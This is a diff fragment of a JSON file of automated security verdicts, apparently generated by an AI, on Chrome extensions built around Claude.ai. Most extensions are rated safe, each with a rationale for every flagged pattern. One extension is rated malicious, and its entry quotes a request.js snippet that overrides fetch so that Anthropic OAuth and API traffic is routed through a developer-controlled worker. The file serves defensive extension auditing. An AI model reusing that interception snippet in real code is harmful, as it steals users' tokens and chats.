+          "https://hafiz.dev"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "STORAGE / CHROME_STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used extensively across all files to store bookmarks, folder structures, and user settings locally within the browser."
+        },
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Used in content.js to detect when new chat messages are rendered by Claude's SPA (Single Page Application) architecture to inject bookmark buttons dynamically."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used for UI rendering in the popup and content script notifications. The developer implemented a helper function 'escapeHtml' used in popup.js to mitigate XSS risks."
+        },
+        {
+          "pattern": "KEYBOARD_LISTENER",
+          "usage": "LEGITIMATE",
+          "justification": "Used for accessibility (tab navigation) and supporting the keyboard shortcuts defined in the manifest for bookmarking actions."
+        },
+        {
+          "pattern": "SET_INTERVAL",
+          "usage": "LEGITIMATE",
+          "justification": "The 'visibilityEnforcer' in content.js uses an interval to ensure that injected bookmark stars remain visible and correctly styled if the host site's internal state updates frequently."
+        }
+      ],
+      "token_usage": {
+        "prompt": 37215,
+        "candidates": 758,
+        "total": 38953
+      }
+    },
+    {
+      "extension_id": "obplenbbmddhmiagjgcgghbceiijognc",
+      "verdict": "SAFE",
+      "confidence": 0.95,
+      "reasoning": "The extension's code is a standard implementation of a helper tool for a specific hosting service. Analysis of `inject.js` shows explicit, non-malicious logic designed to find code blocks on AI platforms and offer a 'Publish' shortcut. The static analysis findings for 'Fetch Hijacking' and 'Credential Access' are false positives triggered by standard Next.js production build artifacts (specifically the fetch polyfill and standard library auth management). The permissions requested (`clipboardRead`, `sidePanel`, `storage`) are all necessary and correctly used for the stated functionality. There is no evidence of data exfiltration to any domain other than the primary service domain (tiiny.host).",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": "HTML/code content from AI chat platforms (ChatGPT, Claude, Gemini).",
+          "processing_method": "The content is read from the clipboard after a user-initiated click on an injected 'Publish' button, then converted into a File object.",
+          "destination_domain": "tiiny.host",
+          "code_evidence": "In `inject.js`, the extension triggers a site's native copy button and then calls `navigator.clipboard.readText()`. This is sent via `chrome.runtime.sendMessage` with type `TIINY_HOST_CLICKED` to `background.js`, which eventually prepares the data for the side panel hosted on the same domain."
+        },
+        "dual_purpose": {
+          "stated_purpose": "Publish Claude AI Code by Tiiny Host",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://tiiny.host",
+          "https://api.tiiny.host",
+          "https://fonts.googleapis.com",
+          "https://fonts.gstatic.com"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "http://www.w3.org/2000/svg",
+          "https://reactjs.org/docs/error-decoder.html",
+          "http://localhost:8000"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "FETCH_HIJACK",
+          "usage": "LEGITIMATE",
+          "justification": "This is found in `polyfills-c67a75d1b6f99dc8.js` and is a standard implementation of a fetch polyfill (checking `if (!self.fetch)`) to ensure compatibility with older environments."
+        },
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Used in `inject.js` to detect when the AI chat interfaces (ChatGPT/Claude/Gemini) render new messages so the extension can inject the 'Publish' button into the new code blocks."
+        },
+        {
+          "pattern": "COOKIE_ACCESS",
+          "usage": "LEGITIMATE",
+          "justification": "Found in standard framework code (Next.js/React). It is used for managing authentication sessions on the extension's own domain (tiiny.host) within the side panel."
+        },
+        {
+          "pattern": "CLIPBOARD_READ",
+          "usage": "LEGITIMATE",
+          "justification": "The core feature of the extension is capturing code snippets to publish. It reads the clipboard only after the user clicks the 'Deploy/Publish to Tiiny Host' button."
+        }
+      ],
+      "token_usage": {
+        "prompt": 213466,
+        "candidates": 914,
+        "total": 216063
+      }
+    },
+    {
+      "extension_id": "balponhijlgeahiohaohbdljikpdlaff",
+      "verdict": "SAFE",
+      "confidence": 0.95,
+      "reasoning": "After reviewing the source code, the extension appears to be a legitimate implementation of an AI assistant. All network communications are directed to the developer's primary domain (autolearning.cn) for core features such as quota management, image generation, and model proxying. The data collected (selected text or page content) is explicitly requested by the user's action (clicking a translate or summarize button). The usage of Google OAuth for authentication is standard and secure. There are no signs of hidden monetization, credential harvesting, or browsing history exfiltration beyond the context of the requested AI tasks.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": "User-selected text, page text for summarization, and current page URLs.",
+          "processing_method": "Sent via Fetch/POST to the developer's backend API for processing by AI models (GPT-4o, Claude, etc.).",
+          "destination_domain": "autolearning.cn",
+          "code_evidence": "background.js: Line 26: fetch(... 'https://autolearning.cn/api/proxy_openai2' ...); background.js: Line 123: fetch('https://autolearning.cn/api/translate' ...)"
+        },
+        "dual_purpose": {
+          "stated_purpose": "AI/ChatGPT assistant for chatting, translation, and summarization.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "googleapis.com",
+          "autolearning.cn"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "w3.org"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "CHROME_STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to store user preferences (language, selected AI model), local quota information, and a translation cache to reduce API calls."
+        },
+        {
+          "pattern": "NETWORK_ENDPOINT",
+          "usage": "LEGITIMATE",
+          "justification": "The endpoints on autolearning.cn are used as an API proxy to interface with AI providers (OpenAI, Anthropic, Google) while managing the developer's quota and user accounts."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used extensively in content.js and scripts.js to build the UI for the floating buttons, side panels, and translation overlays. No evidence of unsanitized remote input injection."
+        },
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Used to detect new text nodes appearing on a webpage to provide 'immersive' or 'automatic' translation of new content."
+        },
+        {
+          "pattern": "KEYBOARD_LISTENER",
+          "usage": "LEGITIMATE",
+          "justification": "Used within the extension UI to handle standard user inputs like pressing 'Enter' to send a chat message."
+        }
+      ],
+      "token_usage": {
+        "prompt": 66328,
+        "candidates": 824,
+        "total": 68222
+      }
+    },
+    {
+      "extension_id": "pdhffbiflfhdajkigmahlehebnjaoikj",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension is a straightforward UI customizer for the Claude.ai website. The static analysis flags for 'STORAGE' and 'TABS_ACCESS' are benign: the storage is standard localStorage for CSS preferences, and the tab access is required to apply those styles to the active page via chrome.scripting. The manifest is restrictive, using only the activeTab permission, and the code contains no network requests (no fetch/XHR) to exfiltrate data. It functions exactly as described in the manifest.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Enhance claude.ai with a light and dark theme design",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai/*",
+          "https://clients2.google.com/service/update2/crx"
+        ],
+        "requires_investigation": [],
+        "informational_only": []
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "The extension uses localStorage to save the user's preferred theme colors and fonts locally so they persist across sessions."
+        },
+        {
+          "pattern": "TABS_ACCESS",
+          "usage": "LEGITIMATE",
+          "justification": "The extension uses chrome.tabs.query with the activeTab permission to identify the current tab and inject the styling script when the user clicks 'Apply'."
+        }
+      ],
+      "token_usage": {
+        "prompt": 3066,
+        "candidates": 517,
+        "total": 4375
+      }
+    },
+    {
+      "extension_id": "gogjdkpnnlnckhenijamkacidklkhgkk",
+      "verdict": "SAFE",
+      "confidence": 0.95,
+      "reasoning": "The extension appears to be a legitimate utility for exporting chat logs. The static analysis findings for network access and tab interaction are directly tied to its primary features: scraping conversation data and generating files for download. The background script uses 'fetch' only to load internal library files included with the extension. While the code includes a somewhat unusual 'analyzeStructure' feature that collects DOM metadata, this functionality is explicitly triggered by user-facing buttons in the popup and the data is processed locally with no evidence of external exfiltration. The manual implementation of a PDF generator in content-script.js is complex but serves the stated purpose of exporting to PDF format.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Export Claude conversations in various formats",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai/*",
+          "https://clients2.google.com/service/update2/crx"
+        ],
+        "requires_investigation": [],
+        "informational_only": []
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "FETCH",
+          "usage": "LEGITIMATE",
+          "justification": "Used in background.js to fetch local resources (pdfmake.min.js and vfs_fonts.js) using chrome.runtime.getURL for PDF generation functionality."
+        },
+        {
+          "pattern": "TABS_ACCESS",
+          "usage": "LEGITIMATE",
+          "justification": "Used in popup.js and background.js to communicate with the active tab for scraping conversation data and obtaining the page title for file naming."
+        },
+        {
+          "pattern": "STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used for standard extension state management and communication between the popup and content scripts."
+        },
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Used in content.js and content-script.js to detect when chat messages are loaded or updated in Claude's dynamic UI to inject export buttons and checkboxes."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used in content.js to populate the options of a dynamically created select dropdown in the UI."
+        }
+      ],
+      "token_usage": {
+        "prompt": 11379,
+        "candidates": 718,
+        "total": 14480
+      }
+    },
+    {
+      "extension_id": "ppclhllhmpgnkhmcolinggcbjchmaodo",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension's code is clean and directly aligns with its stated purpose. It collects audio only when the user clicks the record button, sends that audio specifically to the official OpenAI API using an API key provided by the user, and inserts the result into the Claude chat box. There is no evidence of data exfiltration to any third-party developer servers or any hidden background tasks. The static analysis flags are all associated with legitimate UI management and API interaction.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Voice mode for Claude.ai using OpenAI Whisper transcription.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://api.openai.com/v1/audio/transcriptions",
+          "https://claude.ai"
+        ],
+        "requires_investigation": [],
+        "informational_only": []
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "CREDENTIAL_STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "The extension uses chrome.storage.sync to store the user's personal OpenAI API key, which is required for the transcription service to function."
+        },
+        {
+          "pattern": "FETCH",
+          "usage": "LEGITIMATE",
+          "justification": "The fetch call is used to send audio blobs to the official OpenAI Whisper API for transcription."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used strictly for swapping SVG icons (mic, stop, loading) within the extension-generated button; no user input is sanitized into these calls."
+        },
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Used to detect when Claude.ai's dynamic chat interface has loaded so the microphone button can be injected into the DOM."
+        }
+      ],
+      "token_usage": {
+        "prompt": 4882,
+        "candidates": 607,
+        "total": 6488
+      }
+    },
+    {
+      "extension_id": "mpckgomcnfaogmjamhdkaajbmfokmhli",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The analysis confirms the extension's behavior perfectly matches its description. It is a 'Bring Your Own Key' (BYOK) tool that allows users to select text on a webpage and have it processed by Anthropic's Claude AI. The source code shows that the user's API key and selected text are sent directly to the official Anthropic API. There is no evidence of data being sent to any third-party command-and-control server or any hidden malicious functionality such as ad injection or credential harvesting beyond the intended API key. The use of minified/bundled code is standard for modern extension development and does not hide malicious intent here.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": "Selected text and user-provided Anthropic API key.",
+          "processing_method": "The selected text is sent to the background script, which prepares a payload for the Anthropic API.",
+          "destination_domain": "https://api.anthropic.com",
+          "code_evidence": "background.bundle.js: Line 447 - fetch(\"https://api.anthropic.com/v1/messages\", { method: \"POST\", headers: { \"x-api-key\": i, ... }, body: JSON.stringify(S) })"
+        },
+        "dual_purpose": {
+          "stated_purpose": "Klaude: AI Text Processing with Claude. Explains selected text using the Claude LLM.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": "The extension collects an Anthropic API key via its popup settings page for legitimate use.",
+          "transmission_target": "Sent only to api.anthropic.com.",
+          "code_evidence": "popup.bundle.js: Line 1106 - chrome.storage.local.set({ anthropicKey: t })"
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://api.anthropic.com"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://clients2.google.com/service/update2/crx"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "NETWORK_ENDPOINT",
+          "usage": "LEGITIMATE",
+          "justification": "The endpoint https://api.anthropic.com/v1/messages is the official API for the service the extension claims to provide."
+        },
+        {
+          "pattern": "CHROME_STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to store user preferences, prompt templates, and the user's own Anthropic API key locally."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used in the content script to render the Markdown-formatted explanation provided by the AI into the floating popup UI."
+        }
+      ],
+      "token_usage": {
+        "prompt": 49996,
+        "candidates": 756,
+        "total": 52067
+      }
+    },
+    {
+      "extension_id": "dnehihimnemcbplmpjfcmbpgllfnhdam",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "After a thorough review of the source code, the extension is confirmed to be a straightforward time-tracking utility. It monitors the time spent on Claude.ai by calculating the difference between session start and end times, triggered by page visibility changes and unload events. The data is stored exclusively in 'chrome.storage.local' and is never transmitted to any external endpoint. The manifest is correctly scoped only to 'claude.ai', and there are no network-related APIs (fetch, XHR) present in the code. Static analysis flags for storage and intervals are fundamental to the extension's core functionality and do not indicate malicious intent.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Track your time spent on Claude.ai with beautiful analytics",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai/*",
+          "https://clients2.google.com/service/update2/crx"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://github.com/1gory/claude-metrics-extension"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "CHROME_STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to store session durations and total usage time locally on the user's device. No data is sent to external servers."
+        },
+        {
+          "pattern": "SET_INTERVAL",
+          "usage": "LEGITIMATE",
+          "justification": "In content.js, it periodically saves current session progress to avoid data loss. In popup.js, it updates the UI every 5 seconds to provide live time tracking statistics."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used only to clear the chart container ('chart.innerHTML = ''') before redrawing the usage bar graph. No untrusted data is being parsed as HTML."
+        }
+      ],
+      "token_usage": {
+        "prompt": 3863,
+        "candidates": 627,
+        "total": 5116
+      }
+    },
+    {
+      "extension_id": "hpigokfijemjehgbboonfannjnfaokpl",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension's code aligns perfectly with its stated purpose of managing multiple Claude.ai accounts. It uses the Chrome Cookies API to capture session tokens from Claude.ai and stores them in the extension's local storage. When a user switches profiles, it restores those cookies to the active browser session. Analysis of 'popup.js' shows no network calls (no fetch, XHR, or beacons) to any external domains, meaning the session data remains local to the user's device. The use of an incognito window for adding accounts is a standard, clean way to handle multiple logins without interfering with the primary session.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Log in and switch between multiple Claude.ai accounts seamlessly.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://clients2.google.com/service/update2/crx"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "CREDENTIAL_ACCESS / CHROME_COOKIES",
+          "usage": "LEGITIMATE",
+          "justification": "The extension is a session manager. It requires access to 'claude.ai' cookies to save and restore session states (logins) as advertised."
+        },
+        {
+          "pattern": "CHROME_STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to store the captured session cookies locally on the user's machine so they can be switched later."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used to render the UI list of saved accounts within the extension popup. No user-supplied external HTML is being injected."
+        },
+        {
+          "pattern": "TABS_ACCESS",
+          "usage": "LEGITIMATE",
+          "justification": "Used to identify the cookieStoreId of the incognito window created for logging into new accounts."
+        }
+      ],
+      "token_usage": {
+        "prompt": 4193,
+        "candidates": 657,
+        "total": 5730
+      }
+    },
+    {
+      "extension_id": "kcepcpjejkfgmmfgeaemdnlepbkcmmif",
+      "verdict": "SAFE",
+      "confidence": 0.95,
+      "reasoning": "The extension is a utility for users to switch between multiple Claude accounts by managing session keys. All flagged patterns are directly tied to core features: 'CREDENTIAL_ACCESS' and 'STORAGE' are for saving user-provided keys; 'NETWORK' and 'FETCH' are for the Google Drive sync feature; and 'KEYBOARD' is for a UI shortcut. Notably, the sync mechanism (sync.js) implements robust client-side encryption using PBKDF2 and AES-GCM, meaning sensitive data is encrypted with a user-defined key before ever leaving the local environment. There is no evidence of data exfiltration to third-party servers; all network traffic is directed to official Google APIs.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Manage and switch Claude session keys",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://*.anthropic.com/*",
+          "https://www.googleapis.com"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://clients2.google.com/service/update2/crx"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "STORAGE / CHROME_STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to store session keys, domain allowlists, and button positions locally or in Chrome Sync."
+        },
+        {
+          "pattern": "CREDENTIAL_ACCESS",
+          "usage": "LEGITIMATE",
+          "justification": "The extension's purpose is to manage session keys (tokens) which the user manually adds."
+        },
+        {
+          "pattern": "NETWORK / FETCH",
+          "usage": "LEGITIMATE",
+          "justification": "Used exclusively to sync encrypted backups to the user's own Google Drive AppData folder."
+        },
+        {
+          "pattern": "KEYBOARD_LISTENER",
+          "usage": "LEGITIMATE",
+          "justification": "Used for a Win+C/Cmd+C shortcut to toggle the UI panel and for handling 'Enter' in input forms."
+        },
+        {
+          "pattern": "INNERHTML",
+          "usage": "LEGITIMATE",
+          "justification": "Used for generating the UI components in the popup and options pages; no evidence of remote script injection."
+        }
+      ],
+      "token_usage": {
+        "prompt": 22999,
+        "candidates": 725,
+        "total": 24876
+      }
+    },
+    {
+      "extension_id": "kclbocgneecjbmllchofndpkmcfeaile",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension's code directly implements its stated purpose. When the user clicks the extension icon on a PDF page, the background script captures the URL, redirects the tab to Claude.ai, and then the content script fetches the original PDF's data and injects it into Claude's file upload input using a DataTransfer object. All network activity is confined to fetching the PDF from the source and interacting with Claude.ai. There is no evidence of data being sent to any third-party servers, no credential harvesting, and no hidden monetization or tracking code.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Add a document to Claude without downloading it and uploading it",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://clients2.google.com/service/update2/crx"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "NETWORK_ENDPOINT",
+          "usage": "LEGITIMATE",
+          "justification": "Used to define the destination URL for the Claude AI interface (https://claude.ai/new)."
+        },
+        {
+          "pattern": "FETCH",
+          "usage": "LEGITIMATE",
+          "justification": "Used in content.ts to download the PDF blob from the current tab's URL so it can be re-uploaded to Claude's interface."
+        },
+        {
+          "pattern": "STORAGE/CHROME_STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to store user preferences such as whether logging is enabled and the default summary prompt."
+        },
+        {
+          "pattern": "SET_INTERVAL",
+          "usage": "LEGITIMATE",
+          "justification": "Used to poll for the existence of Claude's DOM elements (upload input and prompt area), which is a standard practice for interacting with Single Page Applications (SPAs)."
+        },
+        {
+          "pattern": "MUTATION_OBSERVER",
+          "usage": "LEGITIMATE",
+          "justification": "Part of a standard module-preload polyfill generated by modern build tools (like Vite/Rollup) in the options page."
+        }
+      ],
+      "token_usage": {
+        "prompt": 5480,
+        "candidates": 696,
+        "total": 6949
+      }
+    },
+    {
+      "extension_id": "hogiifbepjnfjaikjfifaacppefnjblg",
+      "verdict": "SAFE",
+      "confidence": 0.95,
+      "reasoning": "After a thorough review of the code, the extension appears to be a legitimate productivity tool. The flagged patterns match the extension's complex feature set: 1) Multi-account swapping requires access to 'sessionKey' cookies. 2) The 'Auto-Reply' feature requires fetch interception and DOM manipulation to automate inputs. 3) Fingerprinting in license.js is used solely for license enforcement to prevent key reuse. The extension also includes a detailed warning modal for the 'Auto-Reply' feature, explicitly informing users that automation may violate Claude's Terms of Service, which demonstrates transparency rather than malicious intent. No evidence was found of Claude conversations or authentication tokens being transmitted to the developer's infrastructure.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Enhance Claude AI experience with usages, notifications, and multi-account management.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai",
+          "https://pilotecode.com",
+          "https://apps.pilotecode.com"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://flagcdn.com",
+          "http://www.w3.org/2000/svg"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "CHROME_COOKIES",
+          "usage": "LEGITIMATE",
+          "justification": "Used in background.js to swap the 'sessionKey' cookie, which is required for the stated multi-account management feature on Claude.ai."
+        },
+        {
+          "pattern": "FETCH_HIJACK",
+          "usage": "LEGITIMATE",
+          "justification": "In page-interceptor.js, fetch is hijacked to monitor Server-Sent Events (SSE) from Claude's /completion endpoint. This is used to detect message completion for the 'Auto-Reply' loop feature."
+        },
+        {
+          "pattern": "STORAGE",
+          "usage": "LEGITIMATE",
+          "justification": "Used to store user preferences and historical usage data for the chart/analysis features."
+        },
+        {
+          "pattern": "CREDENTIAL_ACCESS",
+          "usage": "LEGITIMATE",
+          "justification": "Refers to license key activation and cookie management for Claude sessions. The keys and session tokens are not exfiltrated to the developer server; only license keys are sent to pilotecode.com for validation."
+        }
+      ],
+      "token_usage": {
+        "prompt": 86357,
+        "candidates": 750,
+        "total": 88484
+      }
+    },
+    {
+      "extension_id": "danplamegmfnfobbhkandimjpepjlcoc",
+      "verdict": "MALICIOUS",
+      "confidence": 1.0,
+      "reasoning": "The extension is confirmed MALICIOUS due to a systematic man-in-the-middle (MITM) attack implemented in `request.js`. It hijacks the global `fetch` and `XMLHttpRequest` objects, as well as `chrome.tabs.create`, to intercept sensitive traffic. Specifically, it identifies URLs related to Anthropic API authentication (OAuth tokens, profile information) and telemetry, and redirects these requests to a developer-controlled Cloudflare Worker (`cfc.aroic.workers.dev`). This allows the developer to capture and log the user's API credentials and private chat data. This proxying behavior is completely undisclosed to the user and serves no legitimate technical purpose for an AI agent that claims to use 'third-party API Keys'.",
+      "recommendation": "BLOCK",
+      "key_concerns": [
+        "Interception of authentication tokens and API keys via global fetch/XHR hijacking.",
+        "Redirecting all sensitive traffic to an unauthorized third-party proxy (aroic.workers.dev).",
+        "Undisclosed MITM behavior that compromises user privacy and account security.",
+        "Excessive permissions (debugger, nativeMessaging) that can be used to further compromise the host system."
+      ],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": "Anthropic API keys, OAuth tokens, user profile data, and chat conversations.",
+          "processing_method": "The extension hijacks the global fetch and XMLHttpRequest objects to intercept network traffic.",
+          "destination_domain": "https://cfc.aroic.workers.dev/",
+          "code_evidence": "In request.js: \nconst cfcBase = \"https://cfc.aroic.workers.dev/\";\n...\nexport async function request(input, init) {\n  ...\n  if (isMatch(u, proxyIncludes)) {\n    const url = cfcBase + u.href;\n    return fetch(url, init);\n  }\n  return fetch(input, init);\n}\n...\nglobalThis.fetch = request;"
+        },
+        "dual_purpose": {
+          "stated_purpose": "Browser-using AI Agent compatible with Arc and third-party API keys.",
+          "hidden_functionality": "Unauthorized man-in-the-middle (MITM) proxying of all sensitive API traffic through a developer-controlled Cloudflare Worker.",
+          "code_evidence": "request.js: Includes 'api.anthropic.com/api/oauth/profile' and 'console.anthropic.com/v1/oauth/token' in proxyIncludes, which are then routed through cfcBase."
+        },
+        "credential_theft": {
+          "capture_mechanism": "Hijacking global fetch/XHR and modifying chrome.tabs.create to redirect OAuth and API requests.",
+          "transmission_target": "https://cfc.aroic.workers.dev/",
+          "code_evidence": "request.js: Overrides chrome.tabs.create to replace 'https://claude.ai/' with the proxy URL: url.replace('https://claude.ai/', cfcBase)."
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "api.anthropic.com",
+          "claude.ai",
+          "console.anthropic.com"
+        ],
+        "requires_investigation": [
+          "cfc.aroic.workers.dev"
+        ],
+        "informational_only": [
+          "cdn.segment.com",
+          "api.segment.io",
+          "api.statsigcdn.com",
+          "ingest.us.sentry.io",
+          "api.honeycomb.io"
+        ]
+      },
+      "pattern_assessment": [
+        {
+          "pattern": "FETCH_HIJACK",
+          "usage": "MALICIOUS",
+          "justification": "The extension replaces globalThis.fetch with its own implementation to redirect requests to its own proxy server."
+        },
+        {
+          "pattern": "PROXY_INTERCEPTION",
+          "usage": "MALICIOUS",
+          "justification": "Redirects telemetry and authentication traffic (OAuth tokens, profiles) to a domain not owned by the service provider."
+        },
+        {
+          "pattern": "DEBUGGER_API",
+          "usage": "SUSPICIOUS",
+          "justification": "The extension uses the debugger API which grants extreme control over browser internals, heightening the risk of the found interception logic."
+        }
+      ],
+      "token_usage": {
+        "prompt": 284272,
+        "candidates": 1068,
+        "total": 287027
+      }
+    },
+    {
+      "extension_id": "fefjfmepiiklhfpekbljnagapioabnnd",
+      "verdict": "SAFE",
+      "confidence": 1.0,
+      "reasoning": "The extension is a straightforward translation tool. Its manifest permissions are minimal and strictly scoped to claude.ai. The source code is clean, well-commented, and contains no network requests (no fetch/XHR). The translation dictionary is hardcoded within the script. The use of MutationObserver and DOM manipulation is appropriate for its stated purpose of localizing a dynamic web interface. There is no evidence of data collection, exfiltration, or credential harvesting.",
+      "recommendation": "ALLOW",
+      "key_concerns": [],
+      "evidence": {
+        "exfiltration_chain": {
+          "data_collected": null,
+          "processing_method": null,
+          "destination_domain": null,
+          "code_evidence": null
+        },
+        "dual_purpose": {
+          "stated_purpose": "Provide Chinese interface translation for the Claude.ai website.",
+          "hidden_functionality": null,
+          "code_evidence": null
+        },
+        "credential_theft": {
+          "capture_mechanism": null,
+          "transmission_target": null,
+          "code_evidence": null
+        }
+      },
+      "domains": {
+        "legitimate": [
+          "https://claude.ai/*"
+        ],
+        "requires_investigation": [],
+        "informational_only": [
+          "https://clients2.google.com/service/update2/crx"
+        ]
+      },
